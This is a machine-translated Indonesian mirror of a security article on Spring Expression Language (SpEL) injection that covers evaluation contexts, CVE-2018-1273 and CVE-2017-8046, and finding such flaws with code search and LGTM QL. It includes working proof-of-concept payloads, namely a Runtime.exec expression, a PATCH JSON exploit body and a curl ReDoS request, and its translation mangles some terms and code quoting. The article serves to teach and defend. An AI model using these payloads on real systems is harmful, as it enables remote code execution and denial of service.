<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§≤ üíÖüèª üé¨ Injeksi spel üí± üë©üèæ‚ÄçüöÄ üë®‚Äçüëß‚Äçüëß</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intro 


 Dalam proses bekerja dan meneliti berbagai layanan, kita dapat semakin memenuhi Kerangka Kerja Pegas. Dan langkah logisnya adalah berkenalan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Injeksi spel</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Intro </h1><br><p>  Dalam proses bekerja dan meneliti berbagai layanan, kita dapat semakin memenuhi Kerangka Kerja Pegas.  Dan langkah logisnya adalah berkenalan dengan strukturnya dan kemungkinan kerentanannya. </p><br><p>  Yang paling menarik untuk setiap Pentester adalah kerentanan yang mengarah pada eksekusi kode. </p><br><p>  Salah satu cara untuk mendapatkan RCE di Spring adalah dengan menyuntikkan ekspresi SpEL. </p><br><p>  Pada artikel ini kami akan mencoba memahami apa itu SpEL, di mana dapat ditemukan, apa fitur penggunaan dan bagaimana menemukan suntikan tersebut. </p><a name="habracut"></a><br><h1 id="what">  Apa? </h1><br><p>  <strong>SpEL</strong> adalah bahasa ekspresi yang dibuat untuk Kerangka Kerja Pegas yang mendukung permintaan dan manajemen grafik objek saat runtime. <br>  Penting juga untuk dicatat bahwa SpEL dibuat sebagai API yang memungkinkan Anda untuk mengintegrasikannya ke dalam aplikasi dan kerangka kerja lain. </p><br><h1 id="gde-mozhno-vstretit">  Di mana saya bisa bertemu? </h1><br><p>  Adalah logis bahwa dalam <strong>Spring Framework</strong> SpEL digunakan sepanjang waktu.  Contoh yang baik adalah Spring Security, di mana hak diberikan menggunakan ekspresi SpEL: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel menggunakan API SpEL;  Di bawah ini adalah contoh dari dokumentasinya. <br>  Pembentukan huruf menggunakan ekspresi SpEL: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Atau Anda dapat menggunakan aturan dari file eksternal, misalnya, untuk menentukan Header: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Berikut adalah beberapa contoh yang terlihat di GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Kerangka Pegas dan Dasar-Dasar SpEL </h1><br><p>  Untuk membuatnya lebih mudah bagi pembaca untuk memahami apa itu injeksi SpEL, Anda perlu mengenal sedikit Spring dan SpEL. </p><br><p>  Elemen kunci dari Spring Framework adalah Spring Container.  Wadah menciptakan objek, mengikat mereka bersama, mengkonfigurasi dan mengelola mereka dari penciptaan hingga kehancuran. </p><br><p>  Untuk mengontrol komponen yang membentuk aplikasi, Spring Container menggunakan <br>  Injeksi Ketergantungan.  Ini adalah ketika objek dikonfigurasi menggunakan entitas eksternal yang disebut Spring Beans - bahasa sehari-hari disebut "kacang." </p><br><p>  Spring Container mengambil metadata konfigurasi dari bean yang diperlukan untuk mendapatkan informasi berikut: instruksi tentang objek apa yang akan dipakai dan bagaimana mengkonfigurasinya melalui metadata. </p><br><p>  Metadata dapat diperoleh dalam 3 cara: </p><br><ul><li>  XML </li><li>  Anotasi Java </li><li>  Kode Java </li></ul><br><p>  Dan poin penting lainnya bagi kita adalah Konteks Aplikasi. </p><br><p>  <strong>ApplicationContext</strong> adalah antarmuka utama dalam aplikasi Spring yang menyediakan informasi konfigurasi aplikasi.  Ini hanya-baca saat runtime, tetapi dapat dimuat ulang jika perlu dan didukung oleh aplikasi.  Jumlah kelas yang mengimplementasikan antarmuka ApplicationContext tersedia untuk berbagai parameter konfigurasi dan jenis aplikasi.  Bahkan, itu adalah aplikasi Spring itu sendiri.  Konteksnya juga menyediakan kemampuan untuk merespons berbagai peristiwa yang terjadi dalam aplikasi, dan untuk mengontrol siklus hidup kacang. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Sekarang mari kita memikirkan metode mendefinisikan kacang dan menggunakan ekspresi SpEL. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Contoh penggunaan tipikal adalah integrasi SpEL ke dalam penciptaan definisi komponen-komponen kacang XML atau beranotasi: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äúexmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Ini adalah bagian dari kode dalam file Bean.xml, hanya untuk satu kacang.  Sebaiknya perhatikan id tempat sampah, yang dapat diakses, dan properti.  Karena  Sebagai bagian dari artikel ini kami mempertimbangkan kemungkinan menggunakan SpEL, maka dalam contoh beberapa opsi untuk menulis ekspresi seperti itu akan diberikan. </p><br><p>  Untuk menunjukkan kepada Spring bahwa ekspresi SpEL datang berikutnya, karakter # digunakan, dan ekspresi itu sendiri dilampirkan dalam kurung: <code>#{SpEL_expression}</code> .  Properti dapat dirujuk menggunakan $ karakter dan melampirkan nama properti di kurung kurawal: <code>${someProperty}</code> .  Penampung properti tidak dapat berisi ekspresi SpEL, tetapi ekspresi dapat berisi referensi properti: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  Dengan demikian, Anda dapat memanggil kelas Java apa pun yang kami butuhkan atau, misalnya, variabel lingkungan akses, yang dapat berguna untuk menentukan nama pengguna atau versi sistem. </p><br><p>  Kenyamanan metode ini dalam menentukan kacang adalah kemampuan untuk mengubahnya tanpa mengkompilasi ulang seluruh aplikasi, sehingga mengubah perilaku aplikasi. </p><br><p>  Dari aplikasi itu sendiri, Anda dapat mengakses kacang ini menggunakan antarmuka ApplicationContext, seperti yang ditunjukkan di bawah ini: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(‚ÄúBean.xml‚Äù); MyExpression example = ctx.getBean(‚Äúexample<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(‚ÄúNumber : "</span></span> + example.getValue()); System.out.println(‚ÄúLocale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(‚ÄúLocale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  Yaitu  di dalam aplikasi, kita cukup mendapatkan nilai-nilai parameter bin yang berisi ekspresi SpEL.  Spring, setelah menerima nilai seperti itu, mengeksekusi ekspresi dan mengembalikan hasil akhir.  Juga, jangan lupa bahwa kode ini tidak akan berfungsi tanpa getter yang sesuai, tetapi deskripsi mereka berada di luar cakupan artikel. </p><br><p>  Cara lain untuk menentukan kacang adalah metode anotasi AnnotationBase - nilai parameter diatur di dalam anotasi untuk beberapa kelas.  Dalam hal ini, penggunaan variabel tidak dimungkinkan. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Agar dapat menggunakan variabel, saat membuat ekspresi SpEL, kita perlu menggunakan antarmuka ExpressionParser.  Dan kemudian sebuah kelas muncul di kode aplikasi, mirip dengan contoh berikut: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser mengubah ekspresi string menjadi objek Ekspresi.  Dengan demikian, nilai ekspresi yang dianalisis dapat diperoleh dalam kerangka kerja EvaluationContext.  EvaluationContext ini akan menjadi satu-satunya objek dari mana semua properti dan variabel dalam string EL akan tersedia. </p><br><p>  Perlu dicatat fakta penting lainnya.  Dengan metode ini menggunakan SpEL, kita hanya perlu ekspresi string untuk mengandung # jika, selain ekspresi itu sendiri, itu berisi string literal. </p><br><p>  Dari semua hal di atas, ada baiknya mengingat dua hal: <br>  1) Jika dimungkinkan untuk mencari berdasarkan kode aplikasi, maka Anda perlu mencari kata kunci seperti: SpelExpressionParser, EvaluationContext dan parseExpression. <br>  2) Pointer penting untuk Spring <code>#{SpEL}</code> , <code>${someProperty}</code> dan <code>T(javaclass)</code> <br>  Jika Anda ingin membaca lebih lanjut tentang Spring dan SpEL, kami sarankan Anda memperhatikan dokumentasi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">docs.spring.io</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  Apa yang bisa dilakukan SpEL? </h1><br><p>  Menurut dokumentasi, SpEL mendukung fungsi berikut: </p><br><ul><li>  Ekspresi literal </li><li>  Boolean dan operator relasional </li><li>  Ekspresi reguler </li><li>  Ekspresi kelas </li><li>  Mengakses properti, array, daftar, peta </li><li>  Doa metode </li><li>  Operator relasional </li><li>  Penugasan </li><li>  Memanggil konstruktor </li><li>  Referensi kacang </li><li>  Konstruksi array </li><li>  Daftar sebaris </li><li>  Peta sebaris </li><li>  Operator ternary </li><li>  Variabel </li><li>  Fungsi yang ditentukan pengguna </li><li>  Proyeksi koleksi </li><li>  Koleksi pilihan </li><li>  Ekspresi templated </li></ul><br><p>  Seperti yang dapat kita lihat, fungsi SpEL sangat kaya, dan ini dapat mempengaruhi keamanan proyek jika input pengguna masuk ke ExpressionParser.  Oleh karena itu, Spring sendiri merekomendasikan untuk menggunakan, alih-alih StandardEcalutionContext yang berfungsi penuh, SimpleEvaluationContext yang lebih sederhana. </p><br><p>  Singkatnya, yang penting bagi kami, SimpleEvaluationContext tidak memiliki kemampuan untuk mengakses kelas Java dan referensi kacang lainnya. </p><br><p>  Deskripsi lengkap fitur sebaiknya dipelajari di situs web dokumentasi: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">KonteksKonteks Evaluasi</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Beberapa koreksi bahkan didasarkan pada perbedaan dalam fungsi SpEL, yang berjalan dalam konteks yang berbeda, tetapi kita akan membicarakannya nanti. </p><br><p>  Untuk membuat semuanya benar-benar jelas, kami memberikan contoh.  Kami memiliki garis yang jelas berbahaya yang mengandung ekspresi SpEL: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  Dan ada dua konteks: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  dan </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Ekspresi exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>kalkulator akan diluncurkan</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>kami akan mendapatkan pesan kesalahan</strong> </p><br><p>  Poin yang sama menariknya adalah kita dapat mulai memproses ekspresi tanpa menentukan konteks apa pun: <code>exp.getValue();</code> <br>  Dalam kasus ini, ekspresi akan dieksekusi dalam konteks standar dan, sebagai akibatnya, kode jahat akan dieksekusi.  Karena itu, jika Anda seorang programmer dan gunakan Spring - jangan pernah lupa untuk mengatur konteks di mana ekspresi harus dieksekusi. </p><br><p>  Kami mengatakan sedikit sebelumnya bahwa beberapa koreksi dibangun di atas perbedaan antara kemampuan SpEL dalam konteks.  Pertimbangkan contoh perbaikan semacam itu. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Kerentanan ini ditemukan dalam metode setPropertyValue dan didasarkan pada dua masalah: <br>  1) Sanitasi yang tidak memadai dari nilai-nilai variabel yang termasuk dalam ExpressionParser. <br>  2) Eksekusi ekspresi dalam bingkai konteks standar. </p><br><p>  Berikut adalah tangkapan layar bagian yang rentan dari kode: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Karena  nama properti tidak memerlukan pemrosesan kompleks dalam kerangka SpEL; solusi logisnya adalah mengganti konteks, menghasilkan kode berikut: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  Tangkapan layar menunjukkan bagian-bagian kode yang mengatur konteks dan ekspresi yang akan dieksekusi.  Tetapi eksekusi ekspresi terjadi di tempat lain: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  Di sinilah ditunjukkan bahwa kami mengeksekusi ekspresi SpEL untuk nilai nilai dalam konteks yang diberikan. <br>  Menggunakan SimpleEvaluationContext membantu melindungi terhadap implementasi Java Class di parseExpression, dan sekarang alih-alih mengeksekusi kode di log server, kita akan melihat kesalahan: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Tetapi ini tidak menyelesaikan masalah dengan kurangnya sanitasi dan mempertahankan kemampuan untuk melakukan serangan ulang: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Oleh karena itu, perbaikan selanjutnya sudah termasuk membersihkan nama parameter. </p><br><h1 id="ot-teorii-k-praktike">  Dari teori ke praktek! </h1><br><p>  Sekarang mari kita lihat beberapa cara untuk mencari injeksi SpEL menggunakan metode Kotak Putih. </p><br><h2 id="step-by-step-cve-2017-8046">  Langkah demi langkah CVE-2017-8046 </h2><br><p>  Pertama, Anda perlu menemukan tempat untuk memproses ekspresi SpEL.  Untuk melakukan ini, Anda cukup menggunakan rekomendasi kami dan menemukan kata kunci dalam kode.  Ingat kata-kata ini: SpelExpressionParser, EvaluationContext, dan parseExpression. </p><br><p>  Pilihan lain adalah menggunakan berbagai plugin untuk menemukan kesalahan dalam kode.  Sejauh ini, satu-satunya plugin yang menunjukkan kemungkinan injeksi SpEL adalah foundecbugs-cli. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Jadi, kami menemukan tempat kami tertarik pada kode.  Katakanlah menggunakan findsecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  Dalam kode aplikasi, kita akan melihat yang berikut: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  Langkah selanjutnya adalah mencari tahu di mana variabel path masuk ke parser ekspresi.  Salah satu cara yang lebih mudah dan gratis adalah dengan menggunakan fungsi IDE IntelijIdea - Analisis Dataflow: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  Dengan membuka gulungan rantai, misalnya, untuk mengganti dan mempelajari metode dan kelas yang ditentukan, kita mendapatkan yang berikut: </p><br><p>  Metode ReplaceOperation mengambil nilai variabel path. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  Dan untuk memanggil metode ganti, Anda harus meneruskan variabel "op" dengan nilai "ganti" ke JSON. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  Demikian pula, kami menemukan semua tempat di mana pengguna dapat memberikan nilai yang dibutuhkannya ke variabel path.  Dan kemudian salah satu opsi eksploitasi untuk kerentanan akan terlihat seperti ini: <br>  Metode Permintaan: PATCH <br>  Badan permintaan: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Menggunakan LGTM QL </h2><br><p>  Menggunakan LGTM QL (untuk keperluan artikel ini, kami cukup menguranginya menjadi QL) adalah cara lain yang menarik untuk mencari kerentanan. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://lgtm.com</a> </p><br><p>  Ini harus segera menetapkan kekurangannya.  Gratis, Anda dapat menganalisis hanya proyek yang ada di gudang terbuka di GitHub, karena  Untuk mengambil gambar proyek, LGTM mengunggah proyek ke servernya dan mengkompilasinya di sana.  Tetapi jika ini tidak mengganggu Anda, maka LGTM QL akan membuka peluang besar bagi Anda dalam menganalisis kode aplikasi. </p><br><p>  Jadi apa itu analisis aplikasi QL? </p><br><p>  Untuk memulainya, seperti yang sudah kami katakan, Anda harus membuat snapshot aplikasi. </p><br><p>  Ketika snapshot siap, dan ini mungkin memakan waktu beberapa jam, Anda bisa mulai menulis kueri seperti SQL sebagai bagian dari sintaks QL.  Untuk melakukan ini, Anda dapat menggunakan plugin untuk Eclipse atau bertindak langsung di konsol pada halaman QL proyek. </p><br><p>  Karena  Sekarang kami sedang mempertimbangkan Spring, dan ini adalah kerangka kerja untuk Java, Anda perlu menggambarkan kelas yang menarik bagi Anda dan metode dari kelas ini, panggilan yang dianggap rentan.  Bagi kami, ini adalah kelas apa pun yang berisi metode yang memanggil ExpressionParser. </p><br><p>  